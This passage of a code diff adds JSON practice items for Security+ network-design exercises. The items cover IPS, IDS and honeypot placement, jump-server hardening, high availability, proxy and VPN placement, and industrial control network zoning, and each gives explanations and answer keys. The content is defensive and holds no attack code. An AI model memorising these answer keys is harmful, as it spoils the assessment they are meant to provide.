+                }
+              ]
+            },
+            {
+              "id": "adds",
+              "label": "What the WAF inspects that FW-1 cannot",
+              "options": [
+                {
+                  "id": "l4",
+                  "text": "Source and destination IP addresses and ports"
+                },
+                {
+                  "id": "http",
+                  "text": "Request content, such as SQL injection strings"
+                },
+                {
+                  "id": "mail",
+                  "text": "Email attachments, looking for malicious macros"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "place": "web",
+            "adds": "http"
+          }
+        }
+      },
+      {
+        "id": "s3",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "FW-1 denies anything not explicitly allowed. Select the three flows it should permit.",
+        "explanation": "Customers need HTTPS to WEB-1, and other mail servers need SMTP to MX-1. WEB-1 needs the database port on DB-1 and nothing else. Opening DB-1 to the internet throws away the protection of keeping it internal. The any-port rule from WEB-1 is the subtle trap: it looks like convenience, but it hands a compromised web server a path to every internal host. RDP from the internet to the directory server is one of the most attacked exposures there is, and admins should come in over a VPN instead.",
+        "payload": {
+          "multi": true,
+          "lines": [
+            {
+              "id": "l1",
+              "text": "Internet → DB-1, TCP 1433"
+            },
+            {
+              "id": "l2",
+              "text": "Internet → WEB-1, TCP 443"
+            },
+            {
+              "id": "l3",
+              "text": "WEB-1 → any internal host, any port"
+            },
+            {
+              "id": "l4",
+              "text": "WEB-1 → DB-1, TCP 1433"
+            },
+            {
+              "id": "l5",
+              "text": "Internet → DC-1, TCP 3389"
+            },
+            {
+              "id": "l6",
+              "text": "Internet → MX-1, TCP 25"
+            }
+          ]
+        },
+        "answer": {
+          "selected": [
+            "l2",
+            "l4",
+            "l6"
+          ]
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-dg-02",
+    "cert": "secplus",
+    "objective": "3.2",
+    "topic": "Network appliances",
+    "title": "Three appliances, three empty spots",
+    "estMinutes": 5,
+    "archetype": "diagram",
+    "scenario": "Fenwick Freight has bought an IPS, an IDS and a honeypot for its head office, and the diagram has three empty positions. Position A sits in the cable path between FW-1 and the core switch SW-1, so every packet to or from the internet crosses it. Position B plugs into a SPAN port on SW-1 and receives a copy of all server traffic. Position C hangs off a spare FW-1 interface, on a segment with no production systems. The security team wants known exploits from the internet stopped before they reach the servers, visibility of server-to-server traffic with no risk of an outage, and early warning of anyone probing for targets. Fenwick takes customer bookings online around the clock, and the operations director has ruled that a failed security appliance must never take bookings offline.",
+    "assets": {
+      "reference": {
+        "kind": "network",
+        "devices": [
+          {
+            "id": "inet",
+            "label": "INTERNET",
+            "type": "box",
+            "x": 0,
+            "y": 0
+          },
+          {
+            "id": "fw1",
+            "label": "FW-1",
+            "type": "firewall",
+            "x": 1,
+            "y": 0
+          },
+          {
+            "id": "posc",
+            "label": "POSITION C",
+            "type": "box",
+            "x": 2,
+            "y": 0
+          },
+          {
+            "id": "posa",
+            "label": "POSITION A",
+            "type": "box",
+            "x": 1,
+            "y": 1
+          },
+          {
+            "id": "posb",
+            "label": "POSITION B",
+            "type": "box",
+            "x": 0,
+            "y": 2
+          },
+          {
+            "id": "sw1",
+            "label": "SW-1",
+            "type": "switch",
+            "ip": "10.50.0.2",
+            "mask": "255.255.255.0",
+            "x": 1,
+            "y": 2
+          },
+          {
+            "id": "srv",
+            "label": "SERVERS",
+            "type": "server",
+            "x": 2,
+            "y": 2
+          }
+        ],
+        "links": [
+          {
+            "from": "inet",
+            "to": "fw1"
+          },
+          {
+            "from": "fw1",
+            "to": "posc"
+          },
+          {
+            "from": "fw1",
+            "to": "posa"
+          },
+          {
+            "from": "posa",
+            "to": "sw1"
+          },
+          {
+            "from": "sw1",
+            "to": "posb"
+          },
+          {
+            "from": "sw1",
+            "to": "srv"
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "s1",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Assign one appliance to each position.",
+        "explanation": "Only the IPS can stop an exploit, and it can only drop packets it actually sits in the path of, so it goes inline at Position A. An IPS on a SPAN port sees copies after the real packets have already been delivered, so it can alert but never block. The IDS fits Position B. It is built to work from a mirrored copy, and if it crashes, server traffic carries on untouched. The honeypot goes on Position C. No legitimate user has any reason to connect to it, so whatever it records is someone probing, and because that segment holds no production systems, an attacker who takes it over has nothing next to it to attack.",
+        "payload": {
+          "slots": [
+            {
+              "id": "posA",
+              "label": "Position A",
+              "options": [
+                {
+                  "id": "ids",
+                  "text": "IDS"
+                },
+                {
+                  "id": "ips",
+                  "text": "IPS"
+                },
+                {
+                  "id": "hp",
+                  "text": "Honeypot"
+                }
+              ]
+            },
+            {
+              "id": "posB",
+              "label": "Position B",
+              "options": [
+                {
+                  "id": "ids",
+                  "text": "IDS"
+                },
+                {
+                  "id": "ips",
+                  "text": "IPS"
+                },
+                {
+                  "id": "hp",
+                  "text": "Honeypot"
+                }
+              ]
+            },
+            {
+              "id": "posC",
+              "label": "Position C",
+              "options": [
+                {
+                  "id": "ids",
+                  "text": "IDS"
+                },
+                {
+                  "id": "ips",
+                  "text": "IPS"
+                },
+                {
+                  "id": "hp",
+                  "text": "Honeypot"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "posA": "ips",
+            "posB": "ids",
+            "posC": "hp"
+          }
+        }
+      },
+      {
+        "id": "s2",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Set how Positions A and B behave.",
+        "explanation": "The operations director has put availability first, so the inline appliance fails open: if it dies, traffic keeps flowing without inspection and bookings stay up. Fail-closed is the right call for a high-security segment, but here it would turn one dead appliance into a booking outage. Position B is passive. It only ever receives a SPAN copy, so it can raise an alert but cannot block anything, and nothing in production depends on it being up.",
+        "payload": {
+          "slots": [
+            {
+              "id": "fail",
+              "label": "If the Position A appliance fails",
+              "options": [
+                {
+                  "id": "closed",
+                  "text": "Fail-closed: block all traffic until it recovers"
+                },
+                {
+                  "id": "open",
+                  "text": "Fail-open: pass traffic uninspected until it recovers"
+                }
+              ]
+            },
+            {
+              "id": "attr",
+              "label": "Position B device attribute",
+              "options": [
+                {
+                  "id": "passive",
+                  "text": "Passive, monitoring a copy of traffic"
+                },
+                {
+                  "id": "active",
+                  "text": "Active, inline and able to drop packets"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "fail": "open",
+            "attr": "passive"
+          }
+        }
+      },
+      {
+        "id": "s3",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Write FW-1's rules for the Position C segment.",
+        "explanation": "The decoy only gives early warning if attackers can reach it, so inbound connections to its decoy services are allowed. Everything leaving it is treated as hostile. A path from the honeypot to SW-1 would turn the decoy into a stepping stone into production, which defeats the point of giving it its own segment. Outbound internet access is blocked or tightly limited so a compromised honeypot cannot be used to attack other organizations or pull down more tooling.",
+        "payload": {
+          "slots": [
+            {
+              "id": "inbound",
+              "label": "Internet to the honeypot's decoy services",
+              "options": [
+                {
+                  "id": "allow",
+                  "text": "Allow"
+                },
+                {
+                  "id": "deny",
+                  "text": "Deny"
+                }
+              ]
+            },
+            {
+              "id": "toLan",
+              "label": "Honeypot to SW-1 and the servers",
+              "options": [
+                {
+                  "id": "allow",
+                  "text": "Allow, so it looks like a normal member of the network"
+                },
+                {
+                  "id": "deny",
+                  "text": "Deny"
+                }
+              ]
+            },
+            {
+              "id": "outbound",
+              "label": "Honeypot out to the internet",
+              "options": [
+                {
+                  "id": "limit",
+                  "text": "Block or tightly limit outbound"
+                },
+                {
+                  "id": "any",
+                  "text": "Allow all outbound, so the decoy looks realistic"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "inbound": "allow",
+            "toLan": "deny",
+            "outbound": "limit"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-dg-03",
+    "cert": "secplus",
+    "objective": "3.2",
+    "topic": "Security zones",
+    "title": "Rework how IT reaches the servers",
+    "estMinutes": 5,
+    "archetype": "diagram",
+    "scenario": "At Larkspur Health, IT admins RDP and SSH straight from their everyday laptops on the user LAN into any server, and an audit has flagged it. The redesign gives FW-1 a third segment, SW-3, for management: the tooling IT uses to control and watch the estate, as opposed to the services staff use. FW-1 will be default-deny between all three segments.",
+    "assets": {
+      "reference": {
+        "kind": "network",
+        "devices": [
+          {
+            "id": "inet",
+            "label": "INTERNET",
+            "type": "box",
+            "x": 2,
+            "y": 0
+          },
+          {
+            "id": "fw1",
+            "label": "FW-1",
+            "type": "firewall",
+            "x": 2,
+            "y": 1
+          },
+          {
+            "id": "sw1",
+            "label": "SW-1",
+            "type": "switch",
+            "zone": "user LAN",
+            "ip": "10.30.1.2",
+            "mask": "255.255.255.0",
+            "x": 0,
+            "y": 1
+          },
+          {
+            "id": "sw2",
+            "label": "SW-2",
+            "type": "switch",
+            "zone": "server zone",
+            "ip": "10.30.2.2",
+            "mask": "255.255.255.0",
+            "x": 1,
+            "y": 3
+          },
+          {
+            "id": "sw3",
+            "label": "SW-3",
+            "type": "switch",
+            "zone": "management",
+            "ip": "10.30.9.2",
+            "mask": "255.255.255.0",
+            "x": 4,
+            "y": 1
+          }
+        ],
+        "links": [
+          {
+            "from": "inet",
+            "to": "fw1"
+          },
+          {
+            "from": "fw1",
+            "to": "sw1"
+          },
+          {
+            "from": "fw1",
+            "to": "sw2"
+          },
+          {
+            "from": "fw1",
+            "to": "sw3"
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "s1",
+        "type": "categorize",
+        "points": 1,
+        "prompt": "Drag each system into the segment where it belongs.",
+        "explanation": "JMP-1 and LOG-1 are both management tooling. The jump server is the single controlled door admins go through, so it sits in the management segment rather than among the servers it controls or the laptops it replaces. The SIEM collector belongs there too. In the server zone, an attacker who compromised one server would share a segment with the system recording the evidence against them. EHR-1 and DB-3 are services staff use, so they live in the server zone, and the ward PC is an ordinary user endpoint.",
+        "payload": {
+          "items": [
+            {
+              "id": "log",
+              "label": "LOG-1 · SIEM collector receiving logs from every server and FW-1"
+            },
+            {
+              "id": "ehr",
+              "label": "EHR-1 · patient records application"
+            },
+            {
+              "id": "pc",
+              "label": "WARD-PC · nurse station workstation"
+            },
+            {
+              "id": "jmp",
+              "label": "JMP-1 · hardened host admins sign in to before touching any server"
+            },
+            {
+              "id": "db",
+              "label": "DB-3 · patient records database"
+            }
+          ],
+          "buckets": [
+            {
+              "id": "user",
+              "label": "User LAN (SW-1)"
+            },
+            {
+              "id": "srv",
+              "label": "Server zone (SW-2)"
+            },
+            {
+              "id": "mgmt",
+              "label": "Management (SW-3)"
+            }
+          ]
+        },
+        "answer": {
+          "map": {
+            "log": "mgmt",
+            "ehr": "srv",
+            "pc": "user",
+            "jmp": "mgmt",
+            "db": "srv"
+          }
+        }
+      },
+      {
+        "id": "s2",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the three flows FW-1 should allow for administration and logging.",
+        "explanation": "Admin laptops reach JMP-1, JMP-1 reaches the servers, and the servers and the firewall send their logs to LOG-1. Direct SSH and RDP from the user LAN to the servers is exactly what the audit flagged. Leave it open and the jump server becomes one optional route among many. LOG-1 only needs to receive, so an any-any rule from it adds risk for nothing. Letting the jump server browse the internet gives malware a way onto the one host that can reach every server.",
+        "payload": {
+          "multi": true,
+          "lines": [
+            {
+              "id": "l1",
+              "text": "Any host on SW-1 → EHR-1 and DB-3, TCP 22 and 3389"
+            },
+            {
+              "id": "l2",
+              "text": "Admin laptops on SW-1 → JMP-1, TCP 3389"
+            },
+            {
+              "id": "l3",
+              "text": "LOG-1 → any host, any port"
+            },
+            {
+              "id": "l4",
+              "text": "EHR-1, DB-3 and FW-1 → LOG-1, syslog over TLS, TCP 6514"
+            },
+            {
+              "id": "l5",
+              "text": "JMP-1 → internet, any port, so admins can download tools"
+            },
+            {
+              "id": "l6",
+              "text": "JMP-1 → EHR-1 and DB-3, TCP 22 and 3389"
+            }
+          ]
+        },
+        "answer": {
+          "selected": [
+            "l2",
+            "l4",
+            "l6"
+          ]
+        }
+      },
+      {
+        "id": "s3",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Harden JMP-1.",
+        "explanation": "A jump server should do one job. Every extra application is attack surface on the one host that can reach every server, and email and browsing are how phishing and drive-by malware get in. Named accounts with MFA and logged sessions make every admin action traceable to a person. A shared account wipes out that trail, and sessions left signed in overnight let anyone who gets to an admin laptop walk straight through.",
+        "payload": {
+          "slots": [
+            {
+              "id": "build",
+              "label": "What runs on JMP-1",
+              "options": [
+                {
+                  "id": "desk",
+                  "text": "The standard staff desktop, with email and a web browser"
+                },
+                {
+                  "id": "tools",
+                  "text": "Only the admin tools IT needs, with email and browsing blocked"
+                },
+                {
+                  "id": "own",
+                  "text": "Whatever tools each admin decides to install for their own work"
+                }
+              ]
+            },
+            {
+              "id": "access",
+              "label": "How admins sign in",
+              "options": [
+                {
+                  "id": "mfa",
+                  "text": "Named accounts with MFA, every session logged to LOG-1"
+                },
+                {
+                  "id": "shared",
+                  "text": "One shared admin account, so access is quick in an emergency"
+                },
+                {
+                  "id": "open",
+                  "text": "Named accounts, with sessions left signed in overnight to save time"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "build": "tools",
+            "access": "mfa"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-dg-04",
+    "cert": "secplus",
+    "objective": "3.4",
+    "topic": "High availability",
+    "title": "Keep the booking site up",
+    "estMinutes": 5,
+    "archetype": "diagram",
+    "scenario": "Tidewater Ferries sells every ticket through its booking site, and the board wants it to survive the failure of any single device. Two ISP circuits from different providers, ISP-A and ISP-B, terminate on one firewall, FW-1. Behind it, LB-1 and LB-2 run as an active/passive load balancer pair and spread requests across three web servers, WEB-1 to WEB-3. All three web servers read and write bookings on one database server, DB-1, which has mirrored (RAID 1) disks and is backed up to tape every night.",
+    "assets": {
+      "reference": {
+        "kind": "network",
+        "devices": [
+          {
+            "id": "ispa",
+            "label": "ISP-A",
+            "type": "router",
+            "x": 0,
+            "y": 0
+          },
+          {
+            "id": "fw1",
+            "label": "FW-1",
+            "type": "firewall",
+            "x": 2,
+            "y": 0
+          },
+          {
+            "id": "ispb",
+            "label": "ISP-B",
+            "type": "router",
+            "x": 4,
+            "y": 0
+          },
+          {
+            "id": "lb1",
+            "label": "LB-1",
+            "type": "box",
+            "x": 1,
+            "y": 1
+          },
+          {
+            "id": "lb2",
+            "label": "LB-2",
+            "type": "box",
+            "x": 3,
+            "y": 1
+          },
+          {
+            "id": "web1",
+            "label": "WEB-1",
+            "type": "server",
+            "x": 0,
+            "y": 2
+          },
+          {
+            "id": "web2",
+            "label": "WEB-2",
+            "type": "server",
+            "x": 2,
+            "y": 2
+          },
+          {
+            "id": "web3",
+            "label": "WEB-3",
+            "type": "server",
+            "x": 4,
+            "y": 2
+          },
+          {
+            "id": "db1",
+            "label": "DB-1",
+            "type": "server",
+            "x": 2,
+            "y": 3
+          }
+        ],
+        "links": [
+          {
+            "from": "ispa",
+            "to": "fw1"
+          },
+          {
+            "from": "ispb",
+            "to": "fw1"
+          },
+          {
+            "from": "fw1",
+            "to": "lb1"
+          },
+          {
+            "from": "fw1",
+            "to": "lb2"
+          },
+          {
+            "from": "lb1",
+            "to": "lb2"
+          },
+          {
+            "from": "lb1",
+            "to": "web1"
+          },
+          {
+            "from": "lb1",
+            "to": "web2"
+          },
+          {
+            "from": "lb1",
+            "to": "web3"
+          },
+          {
+            "from": "lb2",
+            "to": "web1"
+          },
+          {
+            "from": "lb2",
+            "to": "web2"
+          },
+          {
+            "from": "lb2",
+            "to": "web3"
+          },
+          {
+            "from": "web1",
+            "to": "db1"
+          },
+          {
+            "from": "web2",
+            "to": "db1"
+          },
+          {
+            "from": "web3",
+            "to": "db1"
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "s1",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select every single point of failure in the current design.",
+        "explanation": "A single point of failure is any component whose loss on its own takes the service down. Two circuits from different providers cover an ISP outage, the load balancers cover each other, and losing one of three web servers only reduces capacity. FW-1 is the gap upstream: both circuits land on it, so when it fails the redundant circuits lead nowhere. DB-1 is the gap downstream. RAID 1 survives a dead disk, not a dead power supply, motherboard or operating system, and a tape backup helps you rebuild after the outage rather than avoid it.",
+        "payload": {
+          "multi": true,
+          "lines": [
+            {
+              "id": "isp",
+              "text": "The ISP-A and ISP-B circuits"
+            },
+            {
+              "id": "fw",
+              "text": "FW-1"
+            },
+            {
+              "id": "lb",
+              "text": "The LB-1 / LB-2 pair"
+            },
+            {
+              "id": "web",
+              "text": "WEB-1 to WEB-3"
+            },
+            {
+              "id": "db",
+              "text": "DB-1"
+            }
+          ]
+        },
+        "answer": {
+          "selected": [
+            "fw",
+            "db"
+          ]
+        }
+      },
+      {
+        "id": "s2",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Choose what to do about each component.",
+        "explanation": "High availability means a second device ready to take over, not a stronger single device. A firewall pair that syncs connection state can fail over without dropping sessions. A faster firewall is still one box, and a second power supply only covers one of the ways it can fail. For DB-1, clustering puts a second server behind the database so the service carries on when the first one dies. More frequent backups shrink how much data you could lose, but they do nothing to keep the site up, and RAID 6 is still one server. The circuits, the load balancer pair and the web pool already survive a single failure, so spending there buys nothing.",
+        "payload": {
+          "slots": [
+            {
+              "id": "isp",
+              "label": "The ISP-A and ISP-B circuits",
+              "options": [
+                {
+                  "id": "third",
+                  "text": "Add a third circuit from ISP-A"
+                },
+                {
+                  "id": "keep",
+                  "text": "No change: it already survives a single failure"
+                }
+              ]
+            },
+            {
+              "id": "fw",
+              "label": "FW-1",
+              "options": [
+                {
+                  "id": "bigger",
+                  "text": "Replace it with a faster model that has twice the throughput"
+                },
+                {
+                  "id": "keep",
+                  "text": "No change: it already survives a single failure"
+                },
+                {
+                  "id": "psu",
+                  "text": "Fit FW-1 with a second, hot-swappable power supply"
+                },
+                {
+                  "id": "pair",
+                  "text": "Add a second firewall as a failover pair with state sync"
+                }
+              ]
+            },
+            {
+              "id": "lb",
+              "label": "The LB-1 / LB-2 pair",
+              "options": [
+                {
+                  "id": "keep",
+                  "text": "No change: it already survives a single failure"
+                },
+                {
+                  "id": "single",
+                  "text": "Replace the pair with one higher-capacity load balancer"
+                }
+              ]
+            },
+            {
+              "id": "web",
+              "label": "WEB-1 to WEB-3",
+              "options": [
+                {
+                  "id": "shared",
+                  "text": "Cluster WEB-1 to WEB-3 on shared storage"
+                },
+                {
+                  "id": "keep",
+                  "text": "No change: it already survives a single failure"
+                }
+              ]
+            },
+            {
+              "id": "db",
+              "label": "DB-1",
+              "options": [
+                {
+                  "id": "hourly",
+                  "text": "Back it up every hour instead of every night, to a second site"
+                },
+                {
+                  "id": "cluster",
+                  "text": "Cluster it with a second server that takes over automatically"
+                },
+                {
+                  "id": "raid6",
+                  "text": "Rebuild its disks as RAID 6 so it survives two disk failures"
+                },
+                {
+                  "id": "keep",
+                  "text": "No change: it already survives a single failure"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "isp": "keep",
+            "lb": "keep",
+            "web": "keep",
+            "fw": "pair",
+            "db": "cluster"
+          }
+        }
+      },
+      {
+        "id": "s3",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Confirm how the load balancer pair keeps serving.",
+        "explanation": "An active/passive pair shares a virtual IP. The standby watches the active unit, usually over a heartbeat link, and claims the virtual IP when the active one goes quiet, so clients never have to learn a new address. Repointing addresses by hand turns a failover into an outage that lasts until someone notices. Health checks give the same protection one tier down: a web server that stops answering is pulled from the pool automatically. Without them, round robin keeps feeding requests to a dead server.",
+        "payload": {
+          "slots": [
+            {
+              "id": "addr",
+              "label": "Address customers' traffic is sent to",
+              "options": [
+                {
+                  "id": "lb1ip",
+                  "text": "LB-1's own address, repointed to LB-2 by hand in an outage"
+                },
+                {
+                  "id": "web1",
+                  "text": "WEB-1's address, since it is the first web server in the pool"
+                },
+                {
+                  "id": "vip",
+                  "text": "A virtual IP that moves to LB-2 if LB-1 stops responding"
+                }
+              ]
+            },
+            {
+              "id": "health",
+              "label": "When WEB-2 crashes",
+              "options": [
+                {
+                  "id": "rr",
+                  "text": "Round robin keeps sending it one request in three until an admin removes it"
+                },
+                {
+                  "id": "probe",
+                  "text": "Health checks fail and the load balancers stop sending it requests"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "addr": "vip",
+            "health": "probe"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-dg-05",
+    "cert": "secplus",
+    "objective": "3.2",
+    "topic": "Proxies and remote access",
+    "title": "Finish the head-office edge",
+    "estMinutes": 5,
+    "archetype": "diagram",
+    "scenario": "Orchard Lane Insurance is rebuilding its head-office edge, and three positions in the diagram are still empty. Position A sits between the staff switch SW-1 and FW-1. Position B sits between FW-1 and the quote portal servers, APP-1 and APP-2. Position C hangs off its own FW-1 interface. Compliance wants all employee web browsing, in the office or on the road, filtered by category and logged per user. Brokers who travel need encrypted access to internal systems from their laptops. For the quote portal, the security team wants the servers' real addresses hidden from the internet, customers' TLS sessions terminated in one place, and requests shared between the two servers. FW-1 sends web traffic from VPN clients through Position A before it reaches the internet.",
+    "assets": {
+      "reference": {
+        "kind": "network",
+        "devices": [
+          {
+            "id": "inet",
+            "label": "INTERNET",
+            "type": "box",
+            "x": 2,
+            "y": 0
+          },
+          {
+            "id": "posc",
+            "label": "POSITION C",
+            "type": "box",
+            "x": 0,
+            "y": 1
+          },
+          {
+            "id": "fw1",
+            "label": "FW-1",
+            "type": "firewall",
+            "x": 2,
+            "y": 1
+          },
+          {
+            "id": "posa",
+            "label": "POSITION A",
+            "type": "box",
+            "x": 1,
+            "y": 2
+          },
+          {
+            "id": "posb",
+            "label": "POSITION B",
+            "type": "box",
+            "x": 4,
+            "y": 2
+          },
+          {
+            "id": "sw1",
+            "label": "SW-1",
+            "type": "switch",
+            "zone": "staff LAN",
+            "ip": "10.60.1.2",
+            "mask": "255.255.255.0",
+            "x": 0,
+            "y": 3
+          },
+          {
+            "id": "app1",
+            "label": "APP-1",
+            "type": "server",
+            "zone": "quote portal",
+            "ip": "10.60.5.11",
+            "mask": "255.255.255.0",
+            "x": 3,
+            "y": 3
+          },
+          {
+            "id": "app2",
+            "label": "APP-2",
+            "type": "server",
+            "zone": "quote portal",
+            "ip": "10.60.5.12",
+            "mask": "255.255.255.0",
+            "x": 4,
+            "y": 3
+          }
+        ],
+        "links": [
+          {
+            "from": "inet",
+            "to": "fw1"
+          },
+          {
+            "from": "fw1",
+            "to": "posc"
+          },
+          {
+            "from": "fw1",
+            "to": "posa"
+          },
+          {
+            "from": "posa",
+            "to": "sw1"
+          },
+          {
+            "from": "fw1",
+            "to": "posb"
+          },
+          {
+            "from": "posb",
+            "to": "app1"
+          },
+          {
+            "from": "posb",
+            "to": "app2"
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "s1",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Assign a device to each empty position.",
+        "explanation": "Direction decides which proxy you need. A forward proxy acts for internal clients going out, so it sits at Position A between staff and the internet, where it can filter by category and log each user's requests. A reverse proxy acts for servers receiving connections from outside, so it sits at Position B in front of APP-1 and APP-2, terminating customers' TLS and handing each request to one of the servers. Swapping the two is the classic trap. The VPN concentrator at Position C terminates the brokers' encrypted tunnels. A jump server is an admin tool for reaching a protected zone, not a way to give remote staff network access.",
+        "payload": {
+          "slots": [
+            {
+              "id": "posA",
+              "label": "Position A",
+              "options": [
+                {
+                  "id": "rev",
+                  "text": "Reverse proxy"
+                },
+                {
+                  "id": "vpn",
+                  "text": "VPN concentrator"
+                },
+                {
+                  "id": "fwd",
+                  "text": "Forward proxy"
+                },
+                {
+                  "id": "jump",
+                  "text": "Jump server"
+                }
+              ]
+            },
+            {
+              "id": "posB",
+              "label": "Position B",
+              "options": [
+                {
+                  "id": "rev",
+                  "text": "Reverse proxy"
+                },
+                {
+                  "id": "vpn",
+                  "text": "VPN concentrator"
+                },
+                {
+                  "id": "fwd",
+                  "text": "Forward proxy"
+                },
+                {
+                  "id": "jump",
+                  "text": "Jump server"
+                }
+              ]
+            },
+            {
+              "id": "posC",
+              "label": "Position C",
+              "options": [
+                {
+                  "id": "rev",
+                  "text": "Reverse proxy"
+                },
+                {
+                  "id": "vpn",
+                  "text": "VPN concentrator"
+                },
+                {
+                  "id": "fwd",
+                  "text": "Forward proxy"
+                },
+                {
+                  "id": "jump",
+                  "text": "Jump server"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "posA": "fwd",
+            "posB": "rev",
+            "posC": "vpn"
+          }
+        }
+      },
+      {
+        "id": "s2",
+        "type": "categorize",
+        "points": 1,
+        "prompt": "Sort each capability under the device that provides it in this design.",
+        "explanation": "Everything that serves staff on their way out belongs to the forward proxy: category filtering, per-user logging, and making requests on the user's behalf so websites see the proxy's address rather than the PC's. Everything that serves customers on their way in belongs to the reverse proxy. It is the only address customers ever see, it handles their TLS, and it decides which server answers each request. If a capability protects or controls your users, think forward. If it fronts your servers, think reverse.",
+        "payload": {
+          "items": [
+            {
+              "id": "cat",
+              "label": "Blocks gambling and malware sites by category"
+            },
+            {
+              "id": "hide",
+              "label": "Keeps the real addresses of APP-1 and APP-2 hidden from customers"
+            },
+            {
+              "id": "log",
+              "label": "Records which employee requested which URL"
+            },
+            {
+              "id": "tls",
+              "label": "Terminates customers' TLS sessions"
+            },
+            {
+              "id": "share",
+              "label": "Shares incoming quote requests between APP-1 and APP-2"
+            },
+            {
+              "id": "cli",
+              "label": "Hides staff machines' internal addresses from the websites they visit"
+            }
+          ],
+          "buckets": [
+            {
+              "id": "fwd",
+              "label": "Forward proxy"
+            },
+            {
+              "id": "rev",
+              "label": "Reverse proxy"
+            }
+          ]
+        },
+        "answer": {
+          "map": {
+            "cat": "fwd",
+            "hide": "rev",
+            "log": "fwd",
+            "tls": "rev",
+            "share": "rev",
+            "cli": "fwd"
+          }
+        }
+      },
+      {
+        "id": "s3",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Set the remote-access profile the brokers' laptops receive.",
+        "explanation": "Compliance wants every employee's browsing filtered and logged, including brokers on the road. A split tunnel sends their web traffic straight out over the hotel or home connection, which bypasses the forward proxy completely. A full tunnel brings it back through head office where the proxy can see it, at the cost of some bandwidth. For authentication, a per-device certificate plus MFA proves both the laptop and the person. A shared key cannot be revoked for one broker without changing it for everyone, and a password on its own falls to phishing or reuse.",
+        "payload": {
+          "slots": [
+            {
+              "id": "tunnel",
+              "label": "Tunnel mode",
+              "options": [
+                {
+                  "id": "split",
+                  "text": "Split tunnel: only internal traffic uses the tunnel"
+                },
+                {
+                  "id": "full",
+                  "text": "Full tunnel: all traffic goes through head office"
+                }
+              ]
+            },
+            {
+              "id": "auth",
+              "label": "Authentication",
+              "options": [
+                {
+                  "id": "certmfa",
+                  "text": "A device certificate plus MFA for each broker"
+                },
+                {
+                  "id": "psk",
+                  "text": "One pre-shared key, shared by every broker's laptop"
+                },
+                {
+                  "id": "pw",
+                  "text": "Username and a long, complex password"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "tunnel": "full",
+            "auth": "certmfa"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-dg-06",
+    "cert": "secplus",
+    "objective": "3.1",
+    "topic": "ICS/SCADA",
+    "title": "Connect the treatment works to head office",
+    "estMinutes": 6,
+    "archetype": "diagram",
+    "scenario": "Marlow Water is rebuilding the network at its treatment works. PLCs drive the pumps and chemical dosing, operators watch them from an HMI, and a historian polls every PLC each second and stores the readings. The new design has three segments: corporate IT, an industrial DMZ, and the OT control network. FW-1 sits between corporate IT and the industrial DMZ, and FW-2 between the industrial DMZ and OT. Corporate IT links back to head office through the WAN router HQ-WAN. Finance wants daily production figures in the ERP system, and the PLC vendor needs remote access a few times a year to diagnose faults.",
+    "assets": {
+      "reference": {
+        "kind": "network",
+        "devices": [
+          {
+            "id": "hq",
+            "label": "HQ-WAN",
+            "type": "router",
+            "x": 1,
+            "y": 0
+          },
+          {
+            "id": "sw1",
+            "label": "SW-1",
+            "type": "switch",
+            "zone": "corporate IT",
+            "ip": "10.70.1.2",
+            "mask": "255.255.255.0",
+            "x": 0,
+            "y": 1
+          },
+          {
+            "id": "fw1",
+            "label": "FW-1",
+            "type": "firewall",
+            "x": 1,
+            "y": 2
+          },
+          {
+            "id": "sw2",
+            "label": "SW-2",
+            "type": "switch",
+            "zone": "industrial DMZ",
+            "ip": "10.70.50.2",
+            "mask": "255.255.255.0",
+            "x": 2,
+            "y": 1
+          },
+          {
+            "id": "fw2",
+            "label": "FW-2",
+            "type": "firewall",
+            "x": 3,
+            "y": 2
+          },
+          {
+            "id": "sw3",
+            "label": "SW-3",
+            "type": "switch",
+            "zone": "OT control",
+            "ip": "10.70.100.2",
+            "mask": "255.255.255.0",
+            "x": 4,
+            "y": 1
+          }
+        ],
+        "links": [
+          {
+            "from": "hq",
+            "to": "sw1"
+          },
+          {
+            "from": "sw1",
+            "to": "fw1"
+          },
+          {
+            "from": "fw1",
+            "to": "sw2"
+          },
+          {
+            "from": "sw2",
+            "to": "fw2"
+          },
+          {
+            "from": "fw2",
+            "to": "sw3"
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "s1",
+        "type": "categorize",
+        "points": 1,
+        "prompt": "Drag each system into the segment where it belongs.",
+        "explanation": "The OT network holds only what the process needs to run: the PLC, the operator HMI and the historian that polls the PLCs every second. ERP-1 is ordinary business IT. The industrial DMZ holds the systems whose job is to exchange something across the boundary. HIST-2 lets finance read production data without touching OT, and RAS-1 gives the vendor a landing point that FW-2 can tightly control. HIST-1 is the tempting mistake. It feels like a reporting system, but it polls the PLCs constantly, so moving it out of OT would mean a permanent flow from outside into the control network.",
+        "payload": {
+          "items": [
+            {
